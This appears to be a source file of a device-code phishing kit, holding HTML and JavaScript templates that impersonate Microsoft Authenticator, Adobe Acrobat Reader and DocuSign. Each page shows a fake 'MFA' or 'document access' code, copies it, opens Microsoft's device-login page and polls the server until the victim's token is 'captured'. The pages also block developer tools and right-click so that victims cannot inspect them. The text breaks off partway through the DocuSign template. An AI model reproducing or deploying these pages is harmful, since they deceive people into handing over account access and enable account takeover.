(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){window.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// Microsoft Authenticator MFA themed page
const DEVICE_CODE_AUTHENTICATOR_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>Microsoft Authenticator - Verification</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAA3RJREFUWEfNl0tsU1cQhv/jO7bj2HHixHkQAkkgJDyaBBKgQFuVCkSRuqhU0UVXXbZlxaKLrlixYtUNUldIXSGxQOqii0qIh6hUCRSJR3g0ISQkJCEJSexAHNu5vmP7+p45595rJzghNKLqok46Ov/MzJn5Z+aMfSX+B/L/N/xJvF7vKrvdvkun023QarWbVSrVep1Ot1GtVm9Qq9V2m81mVyqVVoVCYVEoFGaFQmFSqVRGhUJhVCgURrlcblAqlfr/LPzJ7u5up9/vd/T19Tn7+/udAwMDzsHBQefQ0JBzZGTEOTo66hgbG3OMj487JiYmHJOTk46pqSnH9PS0Y2ZmxjE7O+tramrSPxuAz+ezDg8PW0ZGRizj4+OW6elpS3d3t6Wnp8fS29tr6e/vt4yNjVkmJyctMzMzlrm5OUsgELAEg0FLKBSyBAIBS29vr+npAGp+amrKOjEx YZ2cnLROT09bp6enrTMzM9a5uTnr/Py8dXFx0bqysmJdXV21rq2tWdfX163BYNAaDoctoVDIGgqFrI8FEAgEDAC MgUDA2N/fbxwYGDAODQ0Zh4eHjWNjY8aJiQnj9PS0sa+vz9jf32/s6+sz9vX1GXs7OzuNPT09xp6eHmN3d7fx8QH+ AoiKCQYGBoz9/f3G4eFh4+joqHFiYsI4PT1tnJ+fNy4vLxtXV1eNa2trxvX1dWMoFDIGg0FjMBg0zs7OGh8d QCwWM8zNzRkWFhYMi4uLhqWlJcPy8rJheXnZsLKyYlhdXTWsra0Z1tfXDRsbG4ZgMGiIRCKGSCRiiEQihvX1 dcPDAdTV1ZkmJydNs7OzpoWFBdP8/LxpaWnJ1N3dberu7jb19PQY+/r6jMPDw8axsTHj1NSUcW5uzhgIBIzR aNQYjUaN0WjU+PAAtbW15q6uLnNPT495YGDAPDY2Zh4fHzd3dXWZu7u7zd3d3eb+/n7z8PCweWxszDw5OWlc XFw0LiwsmJaWlkzLy8umxcVF08MBiP/Fixcvnlu3br302muvnXv99df/9u7duy8dO3bspQ8++ODc4cOHz x0+fPjce++9d+7gwYPnDhw4cO7dd989u3///rM7d+482dnZefZ+WjXr6+u1lZWV2vLycm1paalWfG1JSbGm pKTkZocOHTp586233rr5xhtvnDx+/PhJ8b1//Hi9/v7+E3U1Nee2b9jw0datW3+pra39RafXn1er1RdkMtl1 mUx2VSaTXZXL5VdlMtlVmUx2VSaTXZPJZNdlMtl1uVx+XS6XX5fL5TdkMtkNmRQXvgP/AHoBVoPV7QAAAAAA SU5ORK5CYII=">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;min-height:100vh}.header{background:linear-gradient(135deg,#0078d4,#00bcf2);padding:16px 36px;display:flex;align-items:center;gap:14px;flex-shrink:0;box-shadow:0 3px 8px rgba(0,0,0,0.15)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:700;letter-spacing:-0.3px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.1);width:100%;max-width:520px;padding:52px 48px}.logo{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:36px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:800;color:#0078d4}.intro{text-align:center;color:#1a1a1a;font-size:13px;line-height:1.7;margin-bottom:32px;font-weight:600}.info-box{background:linear-gradient(135deg,#e8f4fd,#cfe7f7);border-left:5px solid#0078d4;padding:18px 20px;margin-bottom:32px;font-size:15px;color:#004578;line-height:1.7;border-radius:6px}.code-label{font-size:15px;font-weight:800;color:#0078d4;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px;text-align:center}.code-input{width:100%;background:#fafbfc;border:2px solid#0078d4;border-radius:8px;padding:14px;font-size:20px;font-weight:900;letter-spacing:6px;color:#0078d4;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:14px;user-select:all;transition:all .2s;box-shadow:inset 0 2px 4px rgba(0,0,0,0.05)}.code-input.loading{color:#8a8886;font-size:18px;letter-spacing:normal;border-color:#c8c6c4}.code-input:hover{transform:scale(1.01)}.copy-row{display:flex;justify-content:center;margin-bottom:28px}.copy-btn{background:linear-gradient(135deg,#0078d4,#005a9e);color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:800;display:flex;align-items:center;gap:12px;transition:all .2s;box-shadow:0 4px 12px rgba(0,120,212,0.25)}.copy-btn:hover{background:linear-gradient(135deg,#005a9e,#004578);transform:translateY(-2px);box-shadow:0 6px 16px rgba(0,120,212,0.35)}.copy-btn.copied{background:linear-gradient(135deg,#107c10,#0b5a0b)}.copy-btn svg{width:19px;height:19px;fill:currentColor}.status{font-size:15px;color:#107c10;text-align:center;margin-bottom:22px;min-height:24px;font-weight:700}.btn-primary{display:flex;align-items:center;justify-content:center;gap:14px;width:100%;background:linear-gradient(135deg,#0078d4,#00bcf2);color:#fff;border:none;padding:14px 28px;font-size:14px;font-weight:800;cursor:pointer;border-radius:8px;transition:all .2s;margin-bottom:28px;box-shadow:0 4px 14px rgba(0,120,212,0.3)}.btn-primary:hover{background:linear-gradient(135deg,#005a9e,#0091c8);transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,120,212,0.4)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none;box-shadow:none}.btn-primary svg{flex-shrink:0}.security-box{background:linear-gradient(135deg,#f8fbfd,#e8f3f9);border:2px solid#0078d4;border-radius:8px;padding:20px;margin-bottom:28px;text-align:center}.security-box p{font-size:14px;color:#1a1a1a;line-height:1.7;margin-bottom:16px;font-weight:500}.security-badge{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#0078d4,#00bcf2);color:#fff;padding:12px 24px;border-radius:8px;font-size:15px;font-weight:800;text-decoration:none;transition:all .2s;box-shadow:0 3px 10px rgba(0,120,212,0.25)}.security-badge:hover{background:linear-gradient(135deg,#005a9e,#0091c8);transform:translateY(-1px);box-shadow:0 5px 14px rgba(0,120,212,0.35)}.security-badge svg{width:17px;height:17px;fill:currentColor}.footer-text{text-align:center;font-size:14px;color:#605e5c;margin-bottom:20px;font-weight:500}.timer{text-align:center;font-size:14px;color:#323130;font-weight:700;background:#fff3cd;padding:10px;border-radius:6px}.timer span{font-weight:900;color:#d83b01}.success{display:none;text-align:center;padding:28px 0}.success-icon{width:80px;height:80px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 6px 16px rgba(16,124,16,0.35)}.success-icon svg{width:40px;height:40px;fill:#fff}.success h2{font-size:24px;font-weight:800;color:#1a1a1a;margin-bottom:12px}.success p{font-size:16px;color:#605e5c;margin-bottom:28px;font-weight:500}.success-badge{display:inline-flex;align-items:center;gap:12px;background:linear-gradient(135deg,#dff6dd,#c3ebbf);color:#107c10;padding:14px 28px;border-radius:8px;font-size:16px;font-weight:800;border:2px solid#107c10}.success-badge svg{width:22px;height:22px;fill:currentColor}@media(max-width:500px){.card{padding:40px 32px;border-radius:0}.code-input{font-size:24px;letter-spacing:4px}}</style>
</head>
<body>
<div class="header">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/31/b7/a8/31b7a8f3-a164-d1f8-cc20-0ae39d5cef7d/AppIcon-0-1x_U007emarketing-0-11-0-sRGB-85-220-0.png/400x400ia-75.webp" width="28" height="28" style="border-radius:6px;flex-shrink:0">
<span class="header-title">Microsoft Authenticator</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/31/b7/a8/31b7a8f3-a164-d1f8-cc20-0ae39d5cef7d/AppIcon-0-1x_U007emarketing-0-11-0-sRGB-85-220-0.png/400x400ia-75.webp" width="44" height="44" style="border-radius:10px;flex-shrink:0">
<span class="logo-text">Microsoft Authenticator</span>
</div>
<div id="mainView">
<p class="intro">Complete your multi-factor authentication to proceed.</p>
<div class="info-box">Your organization requires MFA validation. Use the authorization code below on the Microsoft sign-in page to complete authentication.</div>
<div class="code-label">MFA Authorization Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/><path fill="#0078d4" d="M10 15.17l-3.59-3.58L5 13l5 5 9-9-1.41-1.42z"/></svg>
VALIDATE MFA
</button>
<div class="security-box">
<p>Protected by Microsoft Azure Active Directory. Multi-factor authentication keeps your account secure.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
Microsoft Azure Advanced Security
</a>
</div>
<p class="footer-text">Secure authentication powered by Microsoft Azure.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>MFA Validated</h2>
<p>Multi-factor authentication complete. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>MFA Complete</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){window.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// Adobe Acrobat Reader PDF access themed page
const DEVICE_CODE_ADOBE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>Adobe Acrobat Reader - Verify Your Identity</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmRJREFUWEfNl71Kw1AYhk+SNmnTtE3TXzW2VUFBBRFBcXBycHJwcHRwdHRwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwEATBK36h+J3iV4pfKH6m+IniR4ofKL6n+I7iW4pvKL6m+IriC4rPKT6j+ITiY4qPKD6k+IDifYr3KN6leIfiLYo3Kd6geJ3iNYpXKV6heJniJYoXKV6geJ7iOYpnKZ6heJriKYonKZ6geJziMYpHKR6heJjiIYoHKR6guJ/iBYr7KO6juJfiHoo7Ke6kuIPidorbKG6luIXiZoqbKG6kuJ7ieorrKK6luIbiaoqrKK6kuJzicoqLKS6iuJDiAorz+z53d3c/nz7//B8fH99cXl7eXFxc3JyfnzcX5+c3Z2dnd6dnZ3cbaWlpaWtra2tsa2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2lpSVlZaf//n5+cHx8fH+/v7+wcHB/tHx0fHhwc7B8eHu4fHB7s7x8c7u/t7e3t7e3t7u7u7e3t7e7t7u3t7+3t7+3s7Ozs7O3t7ezt7e1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1tbW1t/X78AWz+Bxq3BhLMAAAAASUVORK5CYII=">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:adobe-clean,'Source Sans Pro',-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;min-height:100vh}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}.card{background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:460px;padding:48px 40px;border-top:4px solid#dc143c}.logo{display:flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:32px}.logo-icon{width:56px;height:56px;background:#dc143c;border-radius:4px;display:flex;align-items:center;justify-content:center;margin-bottom:16px}.logo-icon span{color:#fff;font-size:32px;font-weight:900;font-family:adobe-clean,sans-serif}.logo-text-row{display:flex;align-items:baseline;gap:8px}.logo-text{font-size:16px;font-weight:700;color:#505050}.logo-sub{font-size:13px;font-weight:400;color:#707070}.intro{text-align:center;color:#2c2c2c;font-size:14px;line-height:1.6;margin-bottom:28px;font-weight:600}.info-box{background:#fff5f5;border-left:4px solid#dc143c;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#a0041e;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#2c2c2c;margin-bottom:10px}.code-input{width:100%;background:#fafafa;border:2px solid#d4d4d4;border-radius:4px;padding:12px 14px;font-size:18px;font-weight:700;letter-spacing:4px;color:#dc143c;text-align:center;font-family:monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:16px;letter-spacing:normal}.code-input:hover{border-color:#dc143c}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#dc143c;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;font-size:14px;font-weight:700;display:flex;align-items:center;gap:8px;transition:background .2s}.copy-btn:hover{background:#b8112f}.copy-btn.copied{background:#107c10}.copy-btn svg{width:16px;height:16px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:18px;min-height:20px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#1473e6;color:#fff;border:none;padding:12px 24px;font-size:13px;font-weight:700;cursor:pointer;border-radius:4px;transition:background .2s;margin-bottom:24px}.btn-primary:hover{background:#0d66d0}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed}.btn-primary svg{flex-shrink:0}.security-box{background:#f9f9f9;border:1px solid#e1e1e1;border-radius:4px;padding:18px;margin-bottom:20px;text-align:center}.security-box p{font-size:13px;color:#505050;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#1473e6;color:#fff;padding:10px 20px;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#0d66d0}.security-badge svg{width:14px;height:14px;fill:currentColor}.footer-text{text-align:center;font-size:12px;color:#707070;margin-bottom:16px}.timer{text-align:center;font-size:12px;color:#8a8886;font-weight:600}.timer span{font-weight:700;color:#dc143c}.success{display:none;text-align:center;padding:20px 0}.success-icon{width:64px;height:64px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}.success-icon svg{width:32px;height:32px;fill:#fff}.success h2{font-size:20px;font-weight:700;color:#2c2c2c;margin-bottom:10px}.success p{font-size:14px;color:#707070;margin-bottom:20px}.success-badge{display:inline-flex;align-items:center;gap:8px;background:#dff6dd;color:#107c10;padding:10px 20px;border-radius:4px;font-size:14px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:18px;height:18px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:18px;letter-spacing:3px}}</style>
</head>
<body>
<div class="main"><div class="card">
<div class="logo">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/fd/b0/e8/fdb0e8e2-ffe1-32c8-8039-2ea2eb1ed6de/ReleaseAppIcon-0-0-1x_U007emarketing-0-8-0-sRGB-85-220.png/100x100bb.jpg" width="56" height="56" alt="Adobe Acrobat" style="border-radius:12px;margin-bottom:16px;flex-shrink:0">
<div class="logo-text-row">
<span class="logo-text">Adobe</span>
<span class="logo-sub">Acrobat Reader</span>
</div>
</div>
<div id="mainView">
<p class="intro">Access Protected PDF</p>
<p style="text-align:center;font-size:12px;color:#505050;margin-bottom:20px">Use the access code below to unlock your protected PDF document.</p>
<div class="info-box">Your PDF document is encrypted with Adobe Document Cloud security. Use the access code to verify your identity and unlock the file.</div>
<div class="code-label">Document Access Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
UNLOCK PDF
</button>
<div class="security-box">
<p>Your PDF document security is our priority. Adobe uses industry-leading encryption to protect your documents and identity.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
Adobe Secure Platform
</a>
</div>
<p class="footer-text">Protected by Adobe Document Cloud security.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>PDF Unlocked</h2>
<p>Your document is ready. Loading PDF...</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Access Granted</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){window.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// DocuSign document signing themed page
const DEVICE_CODE_DOCUSIGN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>DocuSign - Verify Your Identity</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmZJREFUWEfNl71KA0EUhWdnN5vNz2az2U0iRkSwULCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwUBAEQfAL/qD4neJXil8ofqb4ieJHih8ovqf4juJbim8ovqb4iuILis8pPqP4hOJjio8oPqT4gOJ9ivco3qV4h+Itijcp3qB4neI1ilcpXqF4meIlihcpXqB4nuI5imcpnqF4muIpiicp nqB4nOIxikcpHqF4mOIhigcpHqC4n+I+ivso7qO4l+Jeinso7qa4m+Iuijsp7qS4g+J2itspbqO4leIWipspbqK4keJ6iuspLqO4jOJiiospLqK4kOICivP7Pnd3dz+fPv/8Hx8f31xe Xtqenp7e3t7e2p6ent7d3d3dnZ2d3d7Nzc3tzc3N7f3Nzc39zc3N/c3Nzf39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39 /cHBwcHB4eHh4cHBwcHh4eHh4dHR0dHh4eHh4dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0 dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR0dHR/X78A W/5Diq5h+kFzAAAAAElFTkSuQmCC">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fafafa;display:flex;flex-direction:column;min-height:100vh}.header{background:#1a1a1a;padding:16px 36px;display:flex;align-items:center;gap:14px;flex-shrink:0}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:800;letter-spacing:-0.5px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1);width:100%;max-width:520px;padding:52px 48px}.logo{display:flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:36px}.logo-icon{display:flex;align-items:center;gap:10px;margin-bottom:12px}.logo-icon 